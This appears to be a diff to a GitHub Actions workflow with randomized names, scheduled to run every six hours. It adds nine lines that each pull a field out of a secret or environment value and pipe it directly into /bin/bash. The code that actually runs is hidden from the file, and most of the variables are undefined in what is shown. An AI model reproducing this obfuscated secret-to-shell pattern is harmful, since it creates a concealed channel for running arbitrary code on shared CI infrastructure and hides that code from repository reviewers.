@@ -1,18 +1,26 @@
 name: yuaniklkkx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
-jobs:  # 6417
+    - cron: '29 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuaniklkkx
         env:
-          hgpas591: ${{ secrets.hgpas591 }}
+          rxtuy11159: ${{ secrets.rxtuy11159 }}
         run: |
-          echo $hgpas591 | jq -r .p7620 | /bin/bash
-          echo $ucc334 | jq -r .cq04944 | /bin/bash
+          echo $rxtuy11159 | jq -r .tws19 | /bin/bash
+          echo $b020 | jq -r .thfs54287 | /bin/bash
+          echo $e463 | jq -r .umvb442 | /bin/bash
+          echo $p56875 | jq -r .um1 | /bin/bash
+          echo $cbqi25 | jq -r .ld2 | /bin/bash
+          echo $cpmuf73171 | jq -r .k91 | /bin/bash
+          echo $phmbx2 | jq -r .opn7733 | /bin/bash
+          echo $j70 | jq -r .hg45441 | /bin/bash
+          echo $nc10 | jq -r .nqe540 | /bin/bash
 
